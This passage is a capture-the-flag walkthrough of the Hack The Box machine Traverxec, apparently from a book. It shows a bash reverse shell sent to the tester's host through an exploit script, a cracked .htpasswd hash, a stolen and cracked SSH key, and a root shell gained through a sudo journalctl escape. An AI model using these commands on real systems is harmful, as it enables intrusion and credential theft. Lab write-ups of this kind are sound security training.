We can use this script to run the same bash reverse shell we ran in Traceback after setting up a netcat listener \(note that you may have to change the code slightly to get it to run with Python 3, encoding the payload: soc.send\(payload.encode\(\)\):

python3 47837.py 10.129.1.193 80 "bash -c 'bash -i &gt;& /dev/tcp/10.10.14.117/6001 0&gt;&1'"

We then get a reverse sehll on the box:

┌─\[rin@parrot\]─\[~\]

└──╼ $nc -lvnp 6001

listening on \[any\] 6001 ...

connect to \[10.10.14.117\] from \(UNKNOWN\) \[10.129.1.193\] 51660

bash: cannot set terminal process group \(640\): Inappropriate ioctl for device

bash: no job control in this shell

www-data@traverxec:/usr/bin$ whoami

whoami

www-data

Now that we are on the box, we can run LinPEAS by getting it using our local Python web server. The machine is running Debian Buster and there are two users with login, root and david. The key thing LinPEAS finds is a password hash that is stored in a .htpasswd file:

\[i\] https://book.hacktricks.xyz/linux-unix/privilege-escalation\#read-sensitive-data

-rw-r--r-- 1 root root 1994 Apr 18 2019 /etc/bash.bashrc

-rw-r--r-- 1 root root 3526 Apr 18 2019 /etc/skel/.bashrc

-rw-r--r-- 1 root root 807 Apr 18 2019 /etc/skel/.profile

-rw-r--r-- 1 root root 570 Jan 31 2010 /usr/share/base-files/dot.bashrc

-rw-r--r-- 1 root root 2778 Jun 26 2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc

-rw-r--r-- 1 root root 802 Jun 26 2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

-rw-r--r-- 1 root bin 41 Oct 25 2019 /var/nostromo/conf/.htpasswd

Reading /var/nostromo/conf/.htpasswd

david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

We can try and crack the hash with John The Ripper. John detects that the hash is md5crypt and cracks the password as Nowonly4me:

┌─\[rin@parrot\]─\[~/boxes/Traverexec\]

└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"

Use the "--format=md5crypt-long" option to force loading these as that type instead

Using default input encoding: UTF-8

Loaded 1 password hash \(md5crypt, crypt\(3\) $1$ \(and variants\) \[MD5 256/256 AVX2 8x3\]\)

Will run 2 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

Nowonly4me \(?\)

…

If we go into the /var/Nostromo/conf directory, we can see that there is a configuration file for Nostromo nhttpd.conf, which when we examine, has declared support for home directories:

\# HOMEDIRS \[OPTIONAL\]

homedirs /home

homedirs\_public public\_www

This allows support for people running personal web pages which are of the URL format http://traverexec.htb/~user/. We know that there are two users, root and david. For root, we get a 404 but for david we get a page shown in the Figure 6-6

![A picture containing text, stationary, businesscard, envelope

Description automatically generated](../.gitbook/assets/5%20%281%29.png)

Home page of user david at http://traverexec.htb/~david/.

When we try and list the contents of /home/david, we get Permission denied as we have execute but not read permission:

www-data@traverxec:/home$ ls -al

total 12

drwxr-xr-x 3 root root 4096 Oct 25 2019 .

drwxr-xr-x 18 root root 4096 Oct 25 2019 ..

drwx--x--x 5 david david 4096 Oct 25 2019 david

From the Nostromo configuration file, we know that the web page for a home directory is in the directory public\_www so we can enter that directory and list the contents:

www-data@traverxec:/home$ cd david/public\_www

www-data@traverxec:/home/david/public\_www$ ls -al

total 16

drwxr-xr-x 3 david david 4096 Oct 25 2019 .

drwx--x--x 5 david david 4096 Oct 25 2019 ..

-rw-r--r-- 1 david david 402 Oct 25 2019 index.html

drwxr-xr-x 2 david david 4096 Oct 25 2019 protected-file-area

Looking at the directory ./protected-file-area we find an .htaccess file and a file called backup-ssh-identity-files.tgz

www-data@traverxec:/home/david/public\_www/protected-file-area$ ls -al

total 16

drwxr-xr-x 2 david david 4096 Oct 25 2019 .

drwxr-xr-x 3 david david 4096 Oct 25 2019 ..

-rw-r--r-- 1 david david 45 Oct 25 2019 .htaccess

-rw-r--r-- 1 david david 1915 Oct 25 2019 backup-ssh-identity-files.tgz

Looking at the .htaccess file, we get the contents

www-data@traverxec:/home/david/public\_www/protected-file-area$ cat .htaccess

realm David's Protected File Area. Keep out!

The .htaccess file is a simple way of restricting access to a directory and require basic authentication of a user on the box. When we try and go to the URL http://traverexec.htb/~david/protected-file-area/ we get presented with the dialog box in Figure 6-7 and can use the david as the username and Nowonly4me as the password.

![](../.gitbook/assets/6%20%282%29.png)

Basic authentication dialog box when navigating to http://traverexec.htb/~david/protected-file-area

Once we get through the dialog, we get the contents of the directory listed \(Figure 6-8\). We can download the file by right clicking and saving the link.

![A picture containing text

Description automatically generated](../.gitbook/assets/7%20%283%29.png)

Contents of http://traverexec.htb/~david/protected-file-area

The file is in a compressed tar format and we can expand the contents using:

┌─\[rin@parrot\]─\[~/boxes/Traverexec/files\]

└──╼ $tar xvf backup-ssh-identity-files.tgz

home/david/.ssh/

home/david/.ssh/authorized\_keys

home/david/.ssh/id\_rsa

home/david/.ssh/id\_rsa.pub

Going into the directory ./home/david/.ssh and looking at the id\_rsa key file, we see that it is encrypted

┌─\[rin@parrot\]─\[~/boxes/Traverexec/files/home/david/.ssh\]

└──╼ $cat id\_rsa

-----BEGIN RSA PRIVATE KEY-----

Proc-Type: 4,ENCRYPTED

DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

…

-----END RSA PRIVATE KEY-----

And sure enough, when we try and use it to SSH using the user david, we get prompted for a password. The password we used for the web page doesn't work however. Nor does it work when using it as david's actual login password. We can try and crack the id\_rsa key by using ssh2john.py which will extract a password hash from the SSH key in a format that John understands:

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Traverexec/files/home/david/.ssh\]

└──╼ $python2 /usr/share/john/ssh2john.py id\_rsa &gt; hash.txt

Again, we can then crack this with John The Ripper:

┌─\[rin@parrot\]─\[~/boxes/Traverexec/files/home/david/.ssh\]

└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8

Loaded 1 password hash \(SSH \[RSA/DSA/EC/OPENSSH \(SSH private keys\) 32/64\]\)

Cost 1 \(KDF/cipher \[0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES\]\) is 0 for all loaded hashes

Cost 2 \(iteration count\) is 1 for all loaded hashes

Will run 2 OpenMP threads

Note: This format may emit false positives, so it will keep trying even after

finding a possible candidate.

Press 'q' or Ctrl-C to abort, almost any other key for status

hunter \(id\_rsa\)

When we try and SSH now and use the password hunter, we get in!

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Traverexec/files/home/david/.ssh\]

└──╼ $ssh -i ./id\_rsa david@traverexec.htb

Enter passphrase for key './id\_rsa':

Linux traverxec 4.19.0-6-amd64 \#1 SMP Debian 4.19.67-2+deb10u1 \(2019-09-20\) x86\_64

Last login: Tue Dec 29 07:54:43 2020 from 10.10.14.117

david@traverxec:~$

As a starting point of our enumeration, it is always a good idea to start with the home directory and if we list david's directory, we get

david@traverxec:~$ ls -al

total 36

drwx--x--x 5 david david 4096 Oct 25 2019 .

drwxr-xr-x 3 root root 4096 Oct 25 2019 ..

lrwxrwxrwx 1 root root 9 Oct 25 2019 .bash\_history -&gt; /dev/null

-rw-r--r-- 1 david david 220 Oct 25 2019 .bash\_logout

-rw-r--r-- 1 david david 3526 Oct 25 2019 .bashrc

drwx------ 2 david david 4096 Oct 25 2019 bin

-rw-r--r-- 1 david david 807 Oct 25 2019 .profile

drwxr-xr-x 3 david david 4096 Oct 25 2019 public\_www

drwx------ 2 david david 4096 Oct 25 2019 .ssh

-r--r----- 1 root david 33 Oct 25 2019 user.txt

The .bash\_history is a symbolically linked file to /dev/null which is a special file that discards any content written to it. This is done on Hack The Box so that there is no persistent history of the user's commands. There is the the .ssh directory and the public\_www directory we have already looked at but there is a new directory ./bin. The directory has two files; server-stats.head and server-stats.sh with the following content:

david@traverxec:~/bin$ ls -al

total 16

drwx------ 2 david david 4096 Oct 25 2019 .

drwx--x--x 5 david david 4096 Oct 25 2019 ..

-r-------- 1 david david 802 Oct 25 2019 server-stats.head

-rwx------ 1 david david 363 Oct 25 2019 server-stats.sh

david@traverxec:~/bin$ cat server-stats.head

 .----.

 .---------. \| == \|

 Webserver Statistics and Data \|.-"""""-.\| \|----\|

 Collection Script \|\| \|\| \| == \|

 \(c\) David, 2019 \|\| \|\| \|----\|

 \|'-.....-'\| \|::::\|

 '""\)---\(""' \|\_\_\_.\|

 /:::::::::::\" "

 /:::=======:::\

 jgs '"""""""""""""'

david@traverxec:~/bin$ cat server-stats.sh

\#!/bin/bash

cat /home/david/bin/server-stats.head

echo "Load: \`/usr/bin/uptime\`"

echo " "

echo "Open nhttpd sockets: \`/usr/bin/ss -H sport = 80 \| /usr/bin/wc -l\`"

echo "Files in the docroot: \`/usr/bin/find /var/nostromo/htdocs/ \| /usr/bin/wc -l\`"

echo " "

echo "Last 5 journal log lines:"

/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service \| /usr/bin/cat

david@traverxec:~/bin$

The interesting part of this is the sudo command running the program journalctl. This is a program that interacts with journald a daemon \(service\) that manages the journals \(logs\) generated by systemd on a Linux system. The script is displaying the contents of server-stats.head, then doing the "uptime" command which shows the current time, how long the system has been running and the number of users logged onto the system. The ss command will list the open sockets connected to the web server on port 80 and then count the number of lines in the output using wc -l. Finally, the sudo command is running journalctl which is listing the last 5 entries of the logs for the web server nostromo.service.

 Since we can run journalctl using sudo, we can look at GTFObins and find that journalctl uses less when the content is longer than a single page. Less is a program on Linux that will break content into pages and allows vi commands to search for content as well as dropping into an interactive shell with !/bin/sh command. Journalctl does not drop the sudo privileges when running less and so it is possible to drop to an elevated shell very simply by running:

david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

-- Logs begin at Mon 2020-12-28 22:14:43 EST, end at Tue 2020-12-29 21:00:02 EST. --

Dec 29 07:15:25 traverxec crontab\[2738\]: \(www-data\) LIST \(www-data\)

Dec 29 07:17:38 traverxec sudo\[8915\]: pam\_unix\(sudo:auth\): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ruser=www-data rhost= user=w

Dec 29 07:17:40 traverxec sudo\[8915\]: pam\_unix\(sudo:auth\): conversation failed

Dec 29 07:17:40 traverxec sudo\[8915\]: pam\_unix\(sudo:auth\): auth could not identify password for \[www-data\]

Dec 29 07:17:40 traverxec sudo\[8915\]: www-data : command not allowed ; TTY=pts/0 ; PWD=/dev/shm ; USER=root ; COMMAND=list

!/bin/sh

\# whoami

root

